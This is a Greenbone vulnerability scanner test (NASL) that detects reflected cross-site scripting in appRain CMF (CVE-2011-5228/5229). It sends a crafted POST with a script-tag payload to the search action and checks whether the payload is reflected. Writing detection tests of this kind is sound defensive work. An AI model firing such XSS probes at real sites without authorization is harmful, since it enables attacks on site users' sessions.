# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801954");
  script_version("2023-12-13T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2011-07-14 13:16:44 +0200 (Thu, 14 Jul 2011)");
  script_cve_id("CVE-2011-5228", "CVE-2011-5229");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("appRain CMF Multiple Cross-Site scripting Vulnerabilities");
  script_xref(name:"URL", value:"http://secpod.org/blog/?p=215");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/48623");
  script_xref(name:"URL", value:"http://secpod.org/advisories/SECPOD_AppRain_Multiple_XSS.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"insight", value:"Multiple flaws are due to an input passed via,

  - 'ss' parameter in 'search' action is not properly verified before it is
  returned to the user.

  - 'data[sconfig][site_title]' parameter in '/admin/config/general' action
  is not properly verified before it is returned to the user.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"appRain CMF is prone to cross site scripting vulnerabilities.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary HTML and script code in a user's browser session in the context of a
  vulnerable site. This may allow an attacker to steal cookie-based authentication
  credentials and launch further attacks.");

  script_tag(name:"affected", value:"appRain CMF version 0.1.5-Beta (Core Edition) and prior.
  appRain CMF version 0.1.3 (Quick Start Edition) and prior.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);
if(!http_can_host_php(port:port))
  exit(0);

host = http_host_name(port:port);

foreach dir (make_list_unique("/appRain", "/apprain", "/", http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  res = http_get_cache(item: dir + "/index.php", port:port);

  if(">Lorem ipsum<" >< res && "Copy Right" >< res)
  {
    filename = string(dir + "/search");
    authVariables = "ss=</title><script>alert('VT-XSS-TEST')</script>";

    req = string("POST ", filename, " HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "User-Agent: ", http_get_user_agent(), "\r\n",
                    "Content-Type: application/x-www-form-urlencoded\r\n",
                    "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                    authVariables);

    res = http_keepalive_send_recv(port:port, data:req);

    if(res =~ "^HTTP/1\.[01] 200" && "<script>alert('VT-XSS-TEST')<" >< res)
    {
      report = http_report_vuln_url(port:port, url:filename);
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);
